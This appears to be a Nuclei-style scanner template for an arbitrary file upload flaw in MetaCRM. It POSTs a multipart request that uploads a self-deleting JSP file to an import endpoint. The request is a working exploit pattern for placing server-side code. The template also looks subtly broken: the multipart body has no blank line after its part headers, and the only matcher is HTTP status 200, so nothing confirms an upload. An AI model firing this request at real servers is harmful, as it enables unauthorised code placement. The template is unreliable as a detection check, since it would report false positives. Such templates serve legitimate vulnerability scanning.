id: metacrm-arbitrary-file-upload
info:
  name: MetaCRM Arbitrary File Upload Vulnerability
  author: Qwen
  severity: high
  description: This rule checks for arbitrary file upload vulnerability in MetaCRM.
requests:
  - method: POST
    path:
      - "/business/common/importdata/sendfile.jsp"
    headers:
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22"
    body: |
      ------WebKitFormBoundary03rNBzFMIytvpW22
      Content-Disposition: form-data; name="file"; filename="1.jsp"
      <%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------WebKitFormBoundary03rNBzFMIytvpW22--
    matchers:
      - type: status
        status:
          - 200
